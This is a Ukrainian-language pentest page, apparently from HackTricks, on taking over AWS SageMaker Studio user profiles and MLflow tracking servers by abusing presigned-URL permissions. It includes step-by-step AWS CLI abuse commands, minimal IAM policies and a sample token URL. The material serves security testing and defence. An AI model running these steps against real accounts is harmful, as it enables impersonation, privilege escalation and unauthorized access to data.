# AWS - SageMaker Несанкціонований доступ

{{#include ../../../../banners/hacktricks-training.md}}

## SageMaker Studio - Захоплення облікового запису через CreatePresignedDomainUrl (Impersonate Any UserProfile)

### Description
Ідентифікатор з дозволом викликати `sagemaker:CreatePresignedDomainUrl` на цільовому Studio `UserProfile` може створити URL для входу, який авторизується безпосередньо в SageMaker Studio під цим профілем. Це надає браузеру нападника сесію Studio, яка успадковує права `ExecutionRole` профілю та повний доступ до домашньої директорії профілю, що зберігається на EFS, та додатків. Не потрібні `iam:PassRole` або доступ до консолі.

### Requirements
- Наявність SageMaker Studio `Domain` та цільового `UserProfile` в ньому.
- Принципал нападника потребує `sagemaker:CreatePresignedDomainUrl` на цільовому `UserProfile` (рівень ресурсу) або `*`.

Minimal policy example (scoped to one UserProfile):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedDomainUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:user-profile/<domain-id>/<user-profile-name>"
}
]
}
```
### Кроки зловживання

1) Перелічте Studio Domain та UserProfiles, на які можна націлитися
```bash
DOM=$(aws sagemaker list-domains --query 'Domains[0].DomainId' --output text)
aws sagemaker list-user-profiles --domain-id-equals $DOM
TARGET_USER=<UserProfileName>
```
2) Згенеруйте presigned URL (дійсний приблизно 5 хвилин за замовчуванням)
```bash
aws sagemaker create-presigned-domain-url \
--domain-id $DOM \
--user-profile-name $TARGET_USER \
--query AuthorizedUrl --output text
```
3) Відкрийте повернений URL у браузері, щоб увійти в Studio як цільовий користувач. У Jupyter терміналі всередині Studio перевірте фактичну ідентичність:
```bash
aws sts get-caller-identity
```
Примітки:
- `--landing-uri` можна опустити. Деякі значення (наприклад, `app:JupyterLab:/lab`) можуть бути відхилені залежно від flavor/version Studio; за замовчуванням зазвичай відбувається перенаправлення на домашню сторінку Studio, а потім у Jupyter.
- Політики Org/обмеження VPC endpoint все ще можуть блокувати мережевий доступ; випуск токена не вимагає входу в консоль або `iam:PassRole`.

### Вплив
- Латеральний рух і ескалація привілеїв шляхом прийняття будь‑якого Studio `UserProfile`, ARN якого дозволено, із наслідуванням його `ExecutionRole` та файлової системи/додатків.

### Докази (з контрольного тесту)
- Маючи лише `sagemaker:CreatePresignedDomainUrl` на цільовому `UserProfile`, роль атакуючого успішно повернула `AuthorizedUrl`, схожий на:
```
https://studio-d-xxxxxxxxxxxx.studio.<region>.sagemaker.aws/auth?token=eyJhbGciOi...
```
- Прямий HTTP-запит відповідає перенаправленням (HTTP 302) на Studio, підтверджуючи, що URL дійсний і активний до закінчення строку дії.


## SageMaker MLflow Tracking Server - ATO via CreatePresignedMlflowTrackingServerUrl

### Опис
Ідентифікація з дозволом викликати `sagemaker:CreatePresignedMlflowTrackingServerUrl` для цільового SageMaker MLflow Tracking Server може згенерувати одноразовий presigned URL, який автентифікується безпосередньо в керованому MLflow UI цього сервера. Це надає той самий доступ, який мав би легітимний користувач до сервера (перегляд/створення experiments і runs, а також завантаження/вивантаження artifacts у S3 artifact store сервера) без доступу до консолі або `iam:PassRole`.

### Вимоги
- Наявність SageMaker MLflow Tracking Server в акаунті/регіоні та його назви.
- Принципал-атакувальник повинен мати `sagemaker:CreatePresignedMlflowTrackingServerUrl` на цільовому MLflow Tracking Server resource (або `*`).

Мінімальний приклад політики (обмежено до одного Tracking Server):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedMlflowTrackingServerUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:mlflow-tracking-server/<tracking-server-name>"
}
]
}
```
### Кроки зловживання

1) Перелічіть MLflow Tracking Servers, які ви можете атакувати, і виберіть одну назву
```bash
aws sagemaker list-mlflow-tracking-servers \
--query 'TrackingServerSummaries[].{Name:TrackingServerName,Status:TrackingServerStatus}'
TS_NAME=<tracking-server-name>
```
2) Згенерувати попередньо підписаний MLflow UI URL (дійсний протягом короткого часу)
```bash
aws sagemaker create-presigned-mlflow-tracking-server-url \
--tracking-server-name "$TS_NAME" \
--expires-in-seconds 300 \
--session-expiration-duration-in-seconds 1800 \
--query AuthorizedUrl --output text
```
3) Відкрийте повернутий URL у браузері, щоб отримати доступ до MLflow UI як авторизований користувач для цього Tracking Server.

Notes:
- Tracking Server має бути в готовому стані (наприклад, `Created/Active`). Якщо він все ще в стані `Creating`, виклик буде відхилено.
- The presigned URL is single‑use and short‑lived; generate a new one when needed.

### Вплив
- Прямий доступ до керованого MLflow UI для цільового Tracking Server, що дозволяє переглядати та змінювати експерименти/запуски і отримувати або завантажувати артефакти, збережені в налаштованому на сервері S3 artifact store, в межах дозволів, накладених конфігурацією сервера.

{{#include ../../../../banners/hacktricks-training.md}}
